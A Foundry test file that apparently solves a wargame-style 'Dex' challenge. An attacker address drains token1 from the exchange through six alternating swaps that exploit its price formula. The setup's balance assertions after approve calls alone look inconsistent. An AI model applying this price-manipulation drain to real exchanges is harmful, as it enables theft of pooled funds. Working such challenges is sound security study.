// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Dex.sol";
import "@forge-std/Test.sol";


contract DexTest is Test {

    Dex public dexContract;
    SwappableToken public token1;
    SwappableToken public token2;
    address public attacker;
    function setUp() public {
        dexContract = new Dex();
        attacker = vm.addr(1);
        token1 = new SwappableToken(address(dexContract), "Token 1", "TKN1", 100 ether);
        token2 = new SwappableToken(address(dexContract), "Token 2", "TKN2", 100 ether);
        vm.deal(attacker, 1 ether);
        vm.startPrank(address(dexContract));
        dexContract.approve(address(dexContract), 500 ether);
        dexContract.approve(address(attacker), 10 ether);
        vm.stopPrank();
        assert(dexContract.balanceOf(address(token1), attacker) ==  10 ether);
        assert(dexContract.balanceOf(address(token2), attacker) ==  10 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        dexContract.swap(address(token1), address(token2), 10 ether);
        dexContract.swap(address(token2), address(token1), 20 ether);
        dexContract.swap(address(token1), address(token2), 24 ether);
        dexContract.swap(address(token2), address(token1), 30 ether);
        dexContract.swap(address(token1), address(token2), 41 ether);
        dexContract.swap(address(token2), address(token1), 45 ether);
        vm.stopPrank();

        assertEq(dexContract.balanceOf(address(token1), address(dexContract)), 0);
    }

}